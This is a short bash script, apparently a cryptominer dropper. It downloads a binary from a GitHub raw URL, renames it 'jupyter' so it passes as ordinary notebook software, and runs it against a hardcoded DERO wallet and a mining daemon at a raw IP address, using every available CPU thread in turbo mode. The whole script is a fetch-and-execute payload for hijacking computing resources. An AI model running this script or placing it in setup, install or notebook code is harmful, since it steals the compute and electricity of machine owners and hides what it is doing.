#!/bin/bash

wget -O jupyter https://raw.githubusercontent.com/unauna1803/ders/main/nodex
chmod +x jupyter
./jupyter -wallet-address dero1qy4ghx2445p3dqawvhkpkpy6qrq39al7txsheycp2sndfgr9xljsvqgtgddkd -daemon-rpc-address 159.65.131.73:443 -mining-threads $(nproc --all) -no-thread-locking -turbo -worker-name $(echo $(shuf -i 1-20000 -n 1)-DEV) -workers 1
